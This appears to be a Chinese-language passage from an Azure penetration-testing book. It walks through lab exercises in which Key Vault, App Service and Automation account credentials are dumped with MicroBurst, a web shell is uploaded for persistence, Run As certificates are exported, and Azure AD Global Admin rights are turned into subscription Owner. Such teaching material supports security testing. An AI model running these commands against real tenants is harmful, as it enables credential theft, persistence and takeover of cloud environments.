  \ 的主要用例是为应用程序开发人员提供一种安全的方式，将其代码在运行时需要使用的敏感信息集中存储，而不使该信息成为代码的一部分。常见存储在 Key Vault\
  \ 中的敏感信息可能是令牌、密码、数据存储连接字符串、API 密钥和其他机密类型。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_251_1.png)\n\
  \n图 6.41 – 应用程序如何访问 Key Vault\n\n正如你所能想象的，像 Key Vault 这样的服务通常是攻击者的热门目标，因为它可能包含可用于在攻击链中横向移动或用于解密加密信息的信息。\n\
  \n对 Key Vault 资源的访问通过两个平面进行控制（图 6.42） – 管理平面，其端点为 `management.azure.com`，以及数据平面，其端点为\
  \ `<vault-name>.vault.azure.com`（图 6.42）。**管理平面**是管理员与之交互以执行管理操作的端点，例如创建和删除 Key\
  \ Vault 实例、检索 Key Vault 属性以及更新访问策略。\n\n**数据平面**是应用程序与之交互以访问存储在保管库中的敏感信息（机密、密钥和证书）的接口。此平面上可以执行的操作包括读取、添加、删除或修改密钥、机密和证书。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_252_0.png)\n\n图 6.42 – 管理平面与数据平面访问\n\n\
  管理平面和数据平面都使用 **Azure Active Directory（Azure AD）** 进行身份验证，但其授权方式不同。管理平面使用 **Azure\
  \ 基于角色的访问控制（Azure RBAC）** 管理权限，而数据平面使用 Key Vault 访问策略，但也可以使用 Azure RBAC 数据权限（参见以下说明）。微软故意采用这种方法，以便组织能够将需要管理级别权限的角色与需要访问敏感信息的角色分开。这里的思路是，对管理平面的访问不一定会给予对数据平面的访问。\n\
  \n> **重要说明**\n> 在本书撰写之时，有一个新发布的特性允许使用 Azure RBAC 来控制对数据平面的授权访问。微软新增了九个新的服务级别角色，包括\
  \ Key Vault Administrator、Key Vault Certificates Officer 和 Key Vault Crypto Officer，这些角色授予在数据平面上执行不同级别操作的权限。在你的侦察活动中请记住这些角色。\n\
  \n从攻击角度来看，Contributor 角色默认对 Key Vault 资源的数据平面没有任何权限。然而，我们可以利用其更新访问策略的权限来提升对数据平面的权限\
  \ – `Microsoft.KeyVault/vaults/accessPolicies/write`。MicroBurst、PowerZure 和 Lava\
  \ 等工具利用此功能来转储 Key Vault 资源中的敏感信息。\n\n在审查密钥保管库时，重要的是首先查看访问策略，看看你的当前用户账户是否对保管库有权限。如果你的用户没有保管库的权限，并且你试图保持隐蔽，你可能需要查看如何使用其他授权的安全主体访问保管库。在许多情况下，这些权限会应用于自动化\
  \ `Run as` 账户（见本章后面）、应用注册和/或托管标识。\n\n以下是使用替代主体访问密钥保管库的一些选项：\n\n- **自动化账户**：创建一个使用\
  \ `Run as` 账户访问密钥保管库的新运行手册。\n- **应用注册**：以应用注册身份进行身份验证并访问密钥保管库。\n- **托管标识**：为该标识生成\
  \ REST API 令牌以访问密钥保管库。\n\n这些选项中的每一个允许你访问保管库的方式都非常不同，但与更改访问策略相比，它们可能是访问保管库更隐蔽的选择。\n\
  \n在下一个动手练习中，我们将使用 MicroBurst 利用 Contributor 角色大规模利用 Key Vault 资源。\n\n以下是泄露信息的截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_256_0.png)\n\n图 6.46 – Get-AzPasswords\
  \ 输出显示在 GridView 中\n\n值得注意的是，一些机密的值中会有关于它们所属资源的信息。例如，数据库或存储账户连接字符串。而其他机密只会是机密信息本身，没有其所属资源或服务的上下文。\n\
  \n一种了解机密被使用位置的方法是审查访问策略。这将允许我们看到哪些应用程序/资源正在使用这些敏感信息。例如，如果一个名为 app1 的托管标识对保管库中的机密具有读取访问策略分配，你可能会推断出分配了\
  \ app1 托管标识的资源会使用这些机密。你也可以审查资源的诊断日志（如果已启用并且你的凭据有权读取）以查看 API 调用来自何处。\n\n使用 Azure\
  \ Key Vault 和 Contributor 角色的另一种攻击模式是添加一个访问策略，允许我们在供应链攻击中生成受信任的证书。密钥保管库允许客户与受支持的第三方证书颁发机构集成，例如\
  \ DigiCert 和 GlobalSign，以简化组织受信任 TLS 证书的签发和管理（图 6.47）：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_256_1.png)\n\
  \n图 6.47 – Key Vault 证书生成流程\n\n请将本章加入书签，因为密钥保管库通常包含在 Azure 环境中提升权限所需的机密。除密钥保管库外，还有\
  \ Azure Web 应用，它们经常包含可用于权限提升和横向移动的凭据（和托管标识）。\n\n### 利用 Web 应用进行横向移动和提升权限\n\nAzure\
  \ Web 应用通常在订阅中用于托管 Web 应用程序和 API。虽然我们之前提到过滥用托管标识的利用，但我们尚未介绍应用程序通常如何被管理。\n\n应用程序代码可以通过多种不同的方式应用到\
  \ App Service 主机。部署中心可以与多种不同的代码存储库解决方案集成以与 CI/CD 管道同步，或代码可以通过手动部署推送。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_257_0.png)\n\
  \n图 6.48 – App Service 部署中心\n\n以下是完成此任务的步骤：\n\n- 1. 使用我们之前配置的 PowerShell 会话，使用 Get-AzPasswords\
  \ 函数执行 App Service 的凭据转储：\n\n    ```\n    Get-AzPasswords -AutomationAccounts N\
  \ -StorageAccounts N -Keys N -ACR N -CosmosDB N -Verbose | Out-GridView\n    ```\n\
  \n- 2. 在提示选择 Azure 订阅时，选择你的测试 Azure 订阅并点击确定：\n\n    ![](img/4fa338e84e0a590967a142dd798ba4e2_259_0.png)\n\
  \n    图 6.50 – 选择适当的订阅\n\n- 3. 在 resulting 输出中，你应该会看到从 App Service 配置中转储的凭据。\n\n\
  \    ![](img/4fa338e84e0a590967a142dd798ba4e2_259_1.png)\n\n    图 6.51 – MicroBurst\
  \ App Service 输出\n\n\n\n\n既然我们已经获得了应用服务发布配置文件，我们接下来将了解这些凭据如何与该应用程序配合使用。\n\n### 在应用服务中的横向移动、权限提升和持久化\n\
  \n从应用服务发布配置文件获取凭据后，我们有几种选择来实现持久化、横向移动和/或提升权限。首先，我们要审查应用程序文件，以查找可能存储在先前的现有配置文件或应用程序代码中的任何凭据。最简单的方法是通过连接到与该应用程序关联的\
  \ FTP 服务器。你可以在 Azure 门户（应用服务 → 部署中心 → FTP 凭据）中获取 FTP 服务器端点。你也可以通过运行以下命令，使用 Azure\
  \ CLI 获取该端点：\n\n```\n```bash\naz webapp deployment list-publishing-profiles --name\
  \ <app-name> --resource-group <group-name> --query \"[? ends_with(profileName, 'FTP')].{profileName:\
  \ profileName, publishUrl: publishUrl}\"\n```\n```\n\n然后你可以使用 FTP 客户端进行连接。如果你没有偏好的\
  \ FTP 客户端，也可以使用带有 FTP:// 路径的 Windows 资源管理器。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_260_0.png)\n\
  \n此时，我们还可以上传一个 Web Shell，从而保持对应用服务器的持久访问，并允许我们运行命令来为任何关联的托管身份生成令牌。如果你选择这种方法，请确保使用你信任的\
  \ Web Shell，并为其设置密码保护，以防其他攻击者访问你的 Shell。\n\n该界面即为 Kudu（`https://github.com/projectkudu/kudu`）服务，它可以提供多种不同的攻击选项。该界面提供\
  \ CMD 和 PowerShell 控制台、文件浏览器以及所有环境设置和变量的导出。\n\n此外，该界面无需向 Azure AD 进行身份验证即可使用。通过访问受影响站点上的\
  \ `https://$APP_NAME.scm.azurewebsites.net/basicauth` 页面，你只需输入发布配置文件中的凭据即可。如果你需要重新获得对订阅的访问权限，这将非常方便。\n\
  \n> **重要说明**\n> \n> 虽然我们在本章中已经介绍了一些横向移动的选项，但其中一位作者之前撰写过一篇博客文章，更深入地探讨了其中一些技术：`https://blog.netspi.com/lateral-movement-azure-app-services/`。\n\
  \n作为本节的最后一点，我们要提到，应用服务应用经常附加托管身份。由于我们之前已经介绍了使用托管身份提升权限的方法（*第5章，利用 IaaS 服务上的参与者权限*），我们想在此指出，这是在攻击应用服务应用时值得关注的一个选项。本章场景创建的应用确实带有一个附加的托管身份，虽然我们没有为其提供练习，但你仍然可以使用示例应用服务应用来练习托管身份利用技能。\n\
  \n接下来进入本章的最后一节，我们将回顾自动化账户以及如何从它们中提取凭据。\n\n### 从自动化账户中提取凭据\n\n与许多云环境相关的目标之一是自动化。它可以简单到自动执行系统配置更改和补丁管理，也可以复杂到自动轮换\
  \ Web 应用上的 SSL 证书并将其存储在 Key Vault 中。\n\n这些操作可以通过在自动化账户中的**运行手册**中运行代码来完成。这些运行手册只是存储在自动化账户中的代码块。代码可以使用\
  \ PowerShell 或 Python（2 或 3）编写，而浏览器内编辑器使得将常见的 Azure 管理功能集成到代码中变得非常容易。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_263_0.png)\n\
  \n*图 6.55 – 创建运行手册的选项*\n\n在 Azure 中可以自动化的任务有成千上万种，但这些操作通常需要访问租户中的安全主体或外部服务的凭据。对于安全主体而言，可以在自动化账户中添加一个\
  \ Run as 账户。该账户可以在订阅或租户内被授予权限，运行手册可以使用该账户代表其进行操作。\n\n此外，还可以为 Run as 账户授予 Key Vault\
  \ 的访问策略权限。这样，该账户就可以从 Key Vault 中获取它可能需要的任何明文凭据，而不是将凭据存储在自动化账户中，或作为变量存储在运行手册代码本身中。\n\
  \n> > **重要说明**\n> >\n> > 由于在环境中经常使用自动化账户访问 Key Vault，MicroBurst 工具包中添加了一个函数，用于使用自动化账户运行手册自动提取\
  \ Key Vault 值。请查看这篇 NetSPI 博客，以更好地了解提取过程，以及它如何导致发现 CVE-2019-0962 漏洞：\n> > https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-automation-accounts-key-stores/.\n\
  \n```\n```powershell\n$Cert = $RunAsCert.Export('pfx','CertificatePassword')\nSet-Content\
  \ -Value $Cert -Path $CertificatePath -Force\n-Encoding Byte | Write-Verbose\n$base64string\
  \ = [Convert]::ToBase64String([IO.File]::ReadAllBytes('$CertificatePath'))\n$base64string\n\
  ```\n```\n\n4. 最后，我们可以查看作业输出以恢复凭据。可以从 Base64 字符串将证书转换回 `pfx` 文件，并且存储的凭据应以明文形式提供。\n\
  \n通过以这种方式写入输出，我们可能会无意中向权限较低的用户暴露环境凭据。为避免这种情况，`Get-AzPasswords` 函数会生成一个证书，用于在传输过程中对凭据进行加密。这可以防止任何旁观者从输出日志中获取明文凭据。\n\
  \n让我们看看在下一个动手练习中，如何使用 MicroBurst 中的 `Get-AzPasswords` 函数来自动化该过程。\n\n## 动手练习 – 在测试自动化账户中创建\
  \ Run as 账户\n\n由于 Run as 账户跨越了订阅和 Azure AD 的边界，我们无法通过编程方式创建这些账户并将其附加到新的自动化账户。幸运的是，这个过程非常简单。下面是我们将在本练习中完成的任务：\n\
  \n- **任务 1：** 为 Azure 自动化账户创建一个 Run as 账户。\n\n以下是完成此任务的步骤：\n\n- 1. 以 `azureadmin`\
  \ 账户或订阅所有者身份登录。\n- 2. 导航到“**自动化账户**”部分。\n- 3. 选择现有的自动化账户或创建一个新账户。\n  如果你要创建新的自动化账户，可以随账户一起创建\
  \ Run as 账户。\n- 4. 在菜单边栏中选择“**Run as 账户**”。\n\n5. 在菜单中选择“**创建 Azure Run As 账户**”。\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_266_0.png)\n\n图 6.56 – 创建 Run as 账户\n\
  \n6. 在下一个窗口中，选择“**创建**”按钮。\n\n这就是我们需要做的全部操作！现在，我们有了一个 Run as 服务主体账户，可以从示例自动化账户中提取信息。默认情况下，此账户将在其创建的订阅上被分配“参与者（Contributor）”角色。\n\
  \n## 动手练习 – 从自动化账户中提取存储的密码和证书\n\n与其他示例非常相似，Get-AzPasswords 函数使我们能够非常轻松地从自动化账户中收集凭据：\n\
  \n- 1. 使用我们之前配置的“参与者（Contributor）”账户启动经过身份验证的 PowerShell 会话，并使用 Get-AzPasswords\
  \ 函数对自动化账户执行凭据转储：\n\n```\n```powershell\nGet-AzPasswords -AppServices N -StorageAccounts\
  \ N -Keys N\n-ACR N -CosmosDB N -Verbose | Out-GridView\n```\n```\n\n\n\n\n\n6.\
  \ 为了验证概念，请运行 `AuthenticateAs-automation-acct-AzureRunAsConnection.ps1` 脚本，以 RunAs\
  \ 帐户身份登录。\n\n```\nPS C:\\Users\\pentestadmin\\MicroBurst> \nPS C:\\Users\\pentestadmin\\\
  MicroBurst> .\\AuthenticateAs-automation-acct-AzureRunAsConnection.ps1\n\nPSParentPath:\n\
  Microsoft.PowerShell.Security\\Certificate::LocalMachine\\My\n\nThumbprint     \
  \                                 Subject\n5E350AC6336F782C3BA500B82FEB82C75E20F93D\
  \       DC=automation-acct_pentest-...\n\nEnvironments : {[AzureChinaCloud, AzureChinaCloud],\
  \ [AzureCloud, AzureCloud], [AzureGermanCloud, AzureGermanCloud], [AzureUSGovernment,\
  \ AzureUSGovernment]}\nContext      : Microsoft.Azure.Commands.Profile.Models.Core.PSAzureContext\n\
  ```\n\n图 6.60 – 使用导出的 PowerShell 脚本进行身份验证\n\n7. 使用以下命令确认当前用户上下文：\n\n```\n(Get-AzContext).Account\n\
  ```\n\n以下是上述命令的屏幕截图：\n\n```\nPS C:\\Users\\pentestadmin\\MicroBurst> (Get-AzContext).Account\n\
  \nId                  : ba5cceb4-96ea-4870-9ade-3bc1850ea86\nType              \
  \  : ServicePrincipal\nTenants             : {40d5707e-b434-4f10-9d7d-21842b956935}\n\
  AccessToken         :\nCredential          :\nTenantMap           : {}\nCertificateThumbprint\
  \ : 5E350AC6336F782C3BA500B82FEB82C75E20F93D\nExtendedProperties  : {[Subscriptions,\
  \ 204cce89-27de-4669-848b-04c27255605e], [Tenants, 40d5707e-b434-4f10-9d7d-21842b956935],\
  \ [CertificateThumbprint, 5E350AC6336F782C3BA500B82FEB82C75E20F93D]}\n```\n\n图 6.61\
  \ – 确认服务主体身份验证\n\n现在，我们已经获得了 Automation 帐户的明文凭据，以及一个可用于以 Run as 帐户身份进行身份验证的私有证书。由于默认情况下会为\
  \ Run as 帐户配置 Contributor 角色，这意味着我们很可能已经在订阅中拥有一个持久的 Contributor 帐户。\n\n> **重要提示**\n\
  > \n> 由于我们并不总是能够获得 Azure 中 Contributor 帐户的凭据，因此还可以使用 REST API 令牌来提取 Automation 帐户的\
  \ Run as 凭据。请查看 MicroBurst 中的 `Get-AzAutomationAccountCredsREST` 函数，以了解如何使用令牌提取\
  \ Automation 帐户凭据：\n> \n> `https://github.com/NetSPI/MicroBurst/blob/master/REST/Get-AzAutomationAccountCredsREST.ps1`。\n\
  \n此外，如果 Run as 帐户被授予了超出默认 Contributor 角色的其他角色，我们或许可以利用这些凭据提升权限，或横向移动到其他订阅。\n\n虽然这种情况并不常见，但作者曾见过被授予根管理组\
  \ Owner 权限的 Run as 帐户。在大多数情况下，这样做是为了允许 Automation 帐户同时自动化管理所有订阅中的更改。这样一来，任何拥有该 Automation\
  \ 帐户 Contributor 访问权限的人，都可以继承根管理组角色，并接管所有订阅。\n\n### 实践练习 – 清理 Contributor（PaaS）利用场景\n\
  \n在最后一项练习中，我们将使用清理脚本，自动删除为本章场景设置的资源。以下是本练习中要完成的任务：\n\n- 从 GitHub 下载清理脚本。\n- 运行脚本，删除为这些场景创建的对象和资源。\n\
  \n完成这些任务的步骤如下：\n\n1. 打开 Web 浏览器，访问 Azure 门户 `https://portal.azure.com`。使用 `azureadmin`\
  \ 凭据登录。\n2. 在 Azure 门户中，单击右上角的 **Cloud Shell** 图标。选择 **PowerShell**：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_269_0.png)\n\
  \n图 6.62 – 打开 Cloud Shell\n\n3. 在 Cloud Shell 窗格中的 PowerShell 会话内，运行以下命令，下载并验证用于删除本章场景所创建资源的脚本：\n\
  \n```powershell\nPS C:\\> Invoke-WebRequest https://bit.ly/contributor-paas-scenarios-cleanup\
  \ -O contributor-paas-scenarios-cleanup.ps1\nPS C:\\> Get-ChildItem\n```\n\n以下是其显示效果的屏幕截图：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_270_0.png)\n\n图 6.63 – 下载脚本的结果\n\n4.\
  \ 使用以下命令运行下载的脚本，删除本章练习所创建的对象和资源：\n\n```powershell\nPS C:\\> ./contributor-paas-scenarios-cleanup.ps1\n\
  ```\n\n### 延伸阅读\n\n如需进一步了解相关主题，请参阅以下资源：\n\n- Azure 控制平面和数据平面：\n  `https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/control-plane-and-data-plane`\n\
  - Azure RBAC 内置角色：\n  `https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles`\n\
  - Key Vault RBAC 指南：\n  `https://docs.microsoft.com/en-us/azure/key-vault/general/rbac-guide`\n"
- "## 利用 Owner 和特权 Azure AD 角色权限\n\n在本书第一章中，我们区分了 Azure AD 角色和 Azure RBAC 角色。我们提到过，Azure\
  \ AD 角色用于管理对 Azure AD 资源和操作的访问权限，例如用户帐户或组的创建，以及密码重置；而 Azure RBAC 角色用于管理对 Azure 资源的访问权限，例如订阅、存储帐户和\
  \ SQL 数据库。大多数情况下，这两项服务具有相互独立的作用域边界。通常，为 Azure AD 分配的角色不会授予管理 Azure 资源的访问权限，而为 Azure\
  \ RBAC 分配的角色也不会授予管理 Azure AD 资源的访问权限。\n\n从订阅 Owner 权限向上提升到根管理组、Azure AD 管理角色或本地部署目标，可能是一项困难的任务。同样地，从\
  \ Azure AD 横向移动到 Azure 订阅资源也可能比较棘手。在本章中，我们将重点介绍一些不同的技术，用于在环境中超出用户现有权限分配的范围进行横向移动。\n\
  \n为了防止横向移动，最佳实践是将两个平面（Azure AD 和 Azure 资源）分开。这意味着应使用不同的用户帐户分别对其进行管理。如果不遵循这一最佳实践，那么入侵一个能够访问\
  \ Azure AD 的身份，就可能被利用来横向移动到 Azure 资源，反之亦然。\n\n话虽如此，即使 Azure AD 和 Azure 资源使用相互独立的用户帐户，攻击者仍有其他可利用的途径。我们将在接下来的章节中介绍其中一些选项。\n\
  \n### 路径 1 – 利用组成员身份\n\nAzure AD 帐户可能默认无法访问 Azure 资源，但如果它拥有修改 Azure AD 中组成员身份的权限，我们就可以利用这一点，将自己的帐户添加到某个拥有\
  \ Azure 资源权限的组中。*图 7.2* 展示了这种攻击的工作方式：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_275_0.png)\n\
  \n*图 7.2 – Azure AD 与订阅之间的关系*\n\n下面简要讨论具体步骤：\n\n1. **User3** 起初无法访问 Azure 资源，但拥有修改\
  \ Azure AD 中组成员身份的权限。\n2. **cloud-architects** 组被分配了 Azure 资源的 Owner 角色。\n3. **User3**\
  \ 将自己添加到 Azure AD 中的 **cloud-architects** 组，而该组恰好拥有 Azure 资源的权限。\n4. 凭借新的组成员身份，**User3**\
  \ 现在拥有了 Azure 资源的权限。\n\n> **重要提示**\n> \n> 尽管本章讨论的重点是 Azure AD 中的 Global Administrator\
  \ 角色，但 Azure AD 中还有其他内置角色也可以用来执行此攻击，包括以下角色：**User Administrator、Groups Administrator\
  \ 和 Directory Writers。**此外，任何拥有以下权限的 Azure AD 自定义角色也可能被利用：\n> \n> `microsoft.directory/groups/members/update`。\n\
  \n这是一个非常简单的攻击，我们在*第 4 章“利用 Reader 权限”*的实践练习中也利用过类似的方法，只是略有不同。如果用户已经拥有订阅中的权限，那么识别订阅中的任何特权组会很容易；但如果我们的\
  \ Active Directory 用户没有任何订阅权限，该怎么办？一种方法是查看 Azure AD 登录日志。\n\nAzure AD 登录日志会自动记录交互式和非交互式登录活动。从攻击角度来看，该日志包含大量信息，攻击者可以据此了解哪些用户能够访问每个\
  \ Azure AD 应用程序、哪些用户帐户或应用程序容易成为攻击目标，以及如何规避防御性配置等信息！\n\n在本例中，我们可以通过门户登录，或使用 Azure\
  \ PowerShell 查看日志，以确定哪些用户能够访问 Azure 资源。随后，我们可以将这些信息与用户的组成员身份关联起来。\n\n要使用 Azure PowerShell\
  \ 查看登录日志，我们首先需要安装 AzureAD 预览版 PowerShell 模块。在撰写本文时，此功能仅在该模块的预览版本中提供。一些预览功能最终可能不会进入正式发布版本，因此该功能将来*可能*不会正式提供。\n\
  \n请注意，该模块无法与 AzureAD 模块的**正式发布（GA）**版本并行安装，因此如果已安装 GA 版本，我们可能需要先将其删除。假设你一直在按照示例操作，那么在设置\
  \ PowerZure 时应该已经安装了 AzureADPreview。\n\n如果尚未设置该模块，可以按照以下说明进行操作：\n\n```powershell\n\
  #### 如果已安装 GA 版本，则将其删除\nUninstall-Module AzureAD\n\n#### 安装 AzureAD 模块的预览版本。随后关闭并\n\
  #### 重新打开 PowerShell 控制台\nInstall-Module AzureADPreview\n\n#### 验证模块的 GA 版本是否已安装\n\
  ```\n\n\n\n\n```powershell\nImport-Module AzureADPreview\nGet-Module AzureADPreview\
  \ | select Name,Version\nName              Version\n----              -------\n\
  AzureADPreview 2.0.2.138\n```\n\n要查看感兴趣事件的登录日志，我们可以使用 `Get-AzureADAuditSignInLogs`\
  \ cmdlet，如下列命令所示（此命令要求使用原生的工作/学校 Azure AD 用户帐户，而不是 Microsoft 帐户）。以下命令将筛选指定时间范围内成功的\
  \ Azure 门户或 Azure PowerShell 登录日志（可以将日期修改为当前日期之前的日期，以获取过去 24 小时的结果）。这些命令的输出提供了有价值的信息，我们可以用来验证\
  \ Azure 管理工具的用户，这通常意味着他们对 Azure 资源具有一定程度的访问权限：\n\n```powershell\n#### First connect\
  \ to Azure AD\nConnect-AzureAD\n\n#### Get successful Azure Portal sign-ins in the\
  \ time range\n#### (greater than the specified date)\nGet-AzureADAuditSignInLogs\
  \ -Filter \"appDisplayName eq 'Azure Portal' and createdDateTime gt $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd'))\
  \ and status/errorCode eq 0\"\n\n#### Get successful Azure PowerShell sign-ins in\
  \ the time range\n#### (greater than the specified date)\nGet-AzureADAuditSignInLogs\
  \ -Filter \"appDisplayName eq 'Microsoft Azure PowerShell' and createdDateTime gt\
  \ $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd')) and status/errorCode eq 0\"\n\
  ```\n\n我们可以进一步筛选，以获得有助于显示用户帐户安全配置的属性。如果我们需要寻找绕过防御的方法，这些信息会很有用：\n\n```powershell\n\
  #### Get interesting authentication properties for successful\n#### Azure Portal\
  \ sign-ins\nGet-AzureADAuditSignInLogs -Filter \"appDisplayName eq 'Azure Portal'\
  \ and createdDateTime gt $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd')) and status/errorCode\
  \ eq 0\" | Select-Object UserPrincipalName, MfaDetail, AppliedConditionalAccessPolicies\n\
  ```\n\n以下是此命令的示例输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_278_0.png)\n\n图7.3\
  \ – 用于登录审计的 PowerShell 命令结果\n\n以下 Azure AD 内置角色具有读取此信息所需的权限：**安全管理员**、**安全读取者**和**报告读取者**。此外，任何具有以下权限的自定义\
  \ Azure AD 角色也可以使用：\n\n- `microsoft.directory/groups/allProperties/allTasks` – 授予读取和更新\
  \ Azure AD 中组属性的权限\n- `microsoft.directory/signInReports/allProperties/read` – 授予读取登录报告的权限\n\
  \n还值得注意的是，如果您的渗透测试范围涵盖此内容，则有机会从 Azure AD 横向移动到其他可能使用 Azure AD 作为其身份提供者的云应用程序。您可以查看\
  \ Azure AD 中的**企业应用程序**，发现与 Azure AD 具有信任关系的其他应用程序。您可以使用此部分来查找已授权用于应用程序的用户及其所属的组。如果访问是通过组授予的，您可以将自己添加到组中以获取对这些云应用程序的权限。\n\
  \n### 路径2 – 重置用户密码\n\n另一个可用于横向移动到其他 Azure 订阅的路径是重置对另一个 Azure 订阅具有权限的用户的密码，并以该用户身份登录。此路径不太受欢迎，因为它会影响用户的现有访问权限，并且更具侵入性。如果用户突然无法使用他们一直使用的密码登录其帐户，则很容易引发警报，并且审计日志会反映最近的密码更改事件。\n\
  \n> **重要说明**\n>\n> 微软提供了有关此功能在 Azure AD 中如何工作的详细文档。请参阅以下 URL 以获取更多信息：`https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin#how-does-elevated-access-work`。\n\
  \n现在我们了解了如何提升权限，让我们通过一个实际示例来演示。\n\n#### 动手练习 – 为全局管理员/所有者利用场景做准备\n\n本动手练习将为我们完成本章其余的练习做好准备。要跟进本章将介绍的场景，您需要在\
  \ Azure AD 租户中设置一个具有全局管理员权限的用户，并在 Azure 订阅中设置另一个具有所有者权限角色的用户。我们已经使用 PowerShell 脚本自动完成了此操作，您可以从\
  \ Azure Cloud Shell 运行该脚本。以下是我们将在本练习中完成的任务：\n\n1. 打开 Web 浏览器并浏览到 Azure 门户（`https://portal.azure.com`）。使用\
  \ `azureadmin` 凭据登录。\n\n2. 在 Azure 门户中，单击 Azure 门户右上角的 Cloud Shell 图标。选择 *PowerShell*：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_282_0.png)\n\n*图7.7 – 单击图标打开 Cloud Shell*\n\
  \n3. 在 Cloud Shell 窗格中的 PowerShell 会话中，运行以下命令下载脚本，以创建具有所有者权限的用户帐户、具有全局管理员权限的第二个用户，并设置所需的易受攻击的工作负载：\n\
  \n```powershell\nPS C:\\> Invoke-WebRequest https://bit.ly/owner-scenarios\n-O owner-scenarios.ps1\n\
  PS C:\\> Get-ChildItem\n```\n\n##### 该脚本有什么作用？\n\n该脚本在 Azure AD 中创建一个具有全局管理员权限的用户帐户，并在\
  \ Azure 订阅中创建另一个具有所有者权限的用户。参见 *图7.10*：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_284_0.png)\n\
  \n图7.10 – 全局管理员/所有者利用场景\n\n5. 脚本完成后，您在本练习其余部分所需的关键信息将显示在输出部分。将信息复制到记事本文档中，以备后用。您需要从输出部分获取四个值：\n\
  \n**Azure全局管理员用户：** 这是 Azure AD 中具有全局管理员权限的管理员用户名。\n\n**Azure全局管理员用户密码：** 这是全局管理员用户的密码。\n\
  \n**Azure所有者用户：** 这是对 Azure 资源具有所有者权限的管理员用户名。\n\n**Azure所有者用户密码：** 这是 Azure 资源所有者用户的密码。\n\
  \n该信息可以在以下屏幕截图中看到：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_285_0.png)\n\n图7.11\
  \ – 获取脚本输出\n\n现在，您已成功创建了在本章后面的练习中将使用的资源。在下一个动手练习中，我们将逐步讲解如何利用“提升访问权限”选项，从 Azure\
  \ AD 横向移动到 Azure 资源。\n\n#### 动手练习 – 提升访问权限\n\n以下是我们将在本练习中完成的任务：\n\n- **任务1：** 验证当前用户访问权限。\n\
  - **任务2：** 使用 Azure CLI 提升访问权限。\n- **任务3：** 验证对 Azure 资源的访问权限。\n\n让我们逐步完成这些任务：\n\
  \n1. 在您的 Pentest VM 上打开 **PowerShell**。\n2. 在 **PowerShell** 控制台中，键入 `bash` 切换到\
  \ **适用于 Linux 的 Windows 子系统**。\n3. 使用以下命令切换到 root 用户。出现提示时，输入管理密码：\n\n```\nazureuser@PentestVM:~#\
  \ sudo su -\n```\n\n4. 使用 Azure CLI 命令 `az login` 进行身份验证：\n\n```\nroot@PentestVM:~#\
  \ az login\n```\n\n以下是此操作的屏幕截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_286_0.png)\n\
  \n图7.12 – az login 结果\n\n5. 出现提示时，输入您在本章第一个练习中从脚本输出中获取的 Azure 全局管理员凭据：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_286_1.png)\n\
  \n图7.13 – Azure 密码提示\n\n您将收到有关无权访问订阅的输出消息。这是因为该帐户仅有权访问 Azure AD，而无法访问任何 Azure 订阅。\n\
  \n\n\n\n7. 运行以下命令，利用全局管理员角色修改 Azure 资源的权限：\n\n   ```bash\n   az rest --method post\
  \ --url \"/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01\"\
  \n   ```\n\n   如果没有收到任何输出，则表示命令已成功完成。\n\n8. 退出登录，然后使用全局管理员凭据重新登录，以确认你现在已拥有 Azure\
  \ 订阅资源的权限：\n\n   ```bash\n   az logout\n   ```\n\n   ```bash\n   az login\n   ```\n\
  \n   以下是相关截图：\n\n   ![](img/4fa338e84e0a590967a142dd798ba4e2_288_0.png)\n\n   *图\
  \ 7.16 – 具有订阅访问权限的 AZ CLI 登录*\n\n9. 使用以下命令，为全局管理员账户分配订阅所有者角色：\n\n   ```bash\n  \
  \ userPrincipalName=$(az ad signed-in-user show --query userPrincipalName -o tsv)\n\
  \   az role assignment create --role \"Owner\" --assignee $userPrincipalName\n \
  \  ```\n\n这些命令将成功执行，证明你已利用提升后的全局管理员角色修改 Azure 资源的权限！以下是命令的输出：\n\n```\nroot@PentestVM:~#\
  \ userPrincipalName=$(az ad signed-in-user show --query userPrincipalName -o tsv)\n\
  root@PentestVM:~# az role assignment create --role \"Owner\" --assignee $userPrincipalName\n\
  {\n  \"canDelegate\": null,\n  \"condition\": null,\n  \"conditionVersion\": null,\n\
  \  \"description\": null,\n  \"id\": \"/subscriptions/204cce89-.../providers/Microsoft.Authorization/roleAssignments/5ac7db39-887b-40c6-a743-e562f2120a6a\"\
  ,\n  \"name\": \"5ac7db39-887b-40c6-a743-e562f2120a6a\",\n}\n```\n\n图 7.17 – 所有者角色分配\n\
  \n现在，我们已经从 Azure AD 修改了对 Azure 订阅的权限。接下来，让我们研究相反的场景，以及可以用于实现这一目标的技术。\n\n### 从订阅所有者提升到\
  \ Azure AD 角色\n\n作为渗透测试的一部分，你可能还会关注如何从 Azure 订阅转向 Azure AD。此目标可能属于某个攻击链，其目的是在 Azure\
  \ AD 中建立后门以实现持久化。我们将在*第 8 章，在 Azure 环境中实现持久化*中介绍持久化这一主题。以下是一些可以用于实现这一目标的技术。\n\n\
  #### 路径 1 – 利用高权限服务主体\n\n与用户账户类似，服务主体和托管标识也可以被分配 Azure AD 角色。许多攻击者认为服务主体和托管标识更容易成为攻击目标，因为它们通常不受条件访问和\
